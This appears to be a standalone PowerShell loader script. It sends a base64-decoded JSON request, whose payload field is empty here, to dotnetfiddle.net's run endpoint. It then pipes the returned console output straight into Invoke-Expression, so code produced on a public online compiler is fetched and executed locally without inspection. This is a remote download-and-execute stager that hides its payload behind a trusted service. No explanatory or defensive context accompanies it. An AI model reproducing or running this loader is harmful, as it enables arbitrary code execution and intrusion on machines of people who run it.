$destinationaddr = "https://dotnetfiddle.net/Home/Run"
$jsonpostrequestbase64 = ""
$jsonpostrequest = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$jsonpostrequestbase64"))
$sendrequest = Invoke-WebRequest -Uri $destinationaddr -Method POST -Body $jsonpostrequest -ContentType "application/json"
$parsedoutput = ((($sendrequest.Content | ConvertFrom-Json | Select ConsoleOutput) -replace "@{ConsoleOutput=", "") -replace '\r?\n[^\n]*\Z')
Invoke-Expression $parsedoutput
